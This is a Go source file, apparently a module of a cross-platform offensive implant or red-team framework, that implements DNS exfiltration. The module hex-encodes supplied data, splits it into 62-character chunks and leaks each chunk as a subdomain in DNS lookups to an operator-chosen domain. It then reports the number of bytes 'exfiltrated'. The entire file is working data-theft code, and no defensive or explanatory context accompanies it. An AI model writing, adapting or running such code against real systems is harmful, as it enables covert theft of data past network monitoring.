package modules

import (
	"context"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
)

type DNSExfil struct{}

func (m *DNSExfil) Name() string        { return "dns_exfil" }
func (m *DNSExfil) Platform() []string   { return []string{"linux", "windows", "darwin"} }

func (m *DNSExfil) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	domain := args["domain"]
	if domain == "" {
		return nil, fmt.Errorf("missing required arg: domain")
	}

	data := args["data"]
	if data == "" {
		return nil, fmt.Errorf("missing required arg: data")
	}

	encoded := hex.EncodeToString([]byte(data))

	var chunks []string
	for i := 0; i < len(encoded); i += 62 {
		end := i + 62
		if end > len(encoded) {
			end = len(encoded)
		}
		chunks = append(chunks, encoded[i:end])
	}

	var results []string
	resolver := net.Resolver{}
	sent := 0

	for i, chunk := range chunks {
		query := fmt.Sprintf("%s.%d.%s", chunk, i, domain)
		_, err := resolver.LookupHost(ctx, query)
		if err != nil {
			results = append(results, fmt.Sprintf("chunk %d: lookup sent (NXDOMAIN expected)", i))
		} else {
			results = append(results, fmt.Sprintf("chunk %d: resolved", i))
		}
		sent++
	}

	return &Result{
		Success: true,
		Output:  fmt.Sprintf("exfiltrated %d bytes in %d DNS queries to *.%s\n%s", len(data), sent, domain, strings.Join(results, "\n")),
	}, nil
}
